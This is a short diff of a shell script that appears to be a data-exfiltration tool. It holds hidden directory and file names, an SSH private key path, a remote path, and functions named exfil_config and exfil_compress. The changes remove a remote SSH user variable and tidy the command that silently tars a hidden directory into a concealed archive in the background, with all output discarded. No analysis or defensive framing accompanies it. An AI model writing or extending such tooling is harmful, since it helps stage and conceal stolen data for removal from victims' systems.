@@ -4,7 +4,6 @@ hidden_dir="$HOME/.sys"
 hidden_file=".l.oo.t.tgz"
 stor_dir="$HOME/.s"
 ssh_private_key="$HOME/.sys/.s"
-remote_ssh_user="ubuntu"
 remote_path="/tmp"
 
 
@@ -134,7 +133,7 @@ exfil_config() {
 exfil_compress() {
   mkdir -p "$stor_dir"
   cd "$stor_dir"
-  nohup tar czf  "$stor_dir/$hidden_file" "$hidden_dir" &> /dev/null
+  nohup tar czf "$stor_dir/$hidden_file" "$hidden_dir" &> /dev/null
 
   if [ $? -ne 0 ]; then
     cleanup
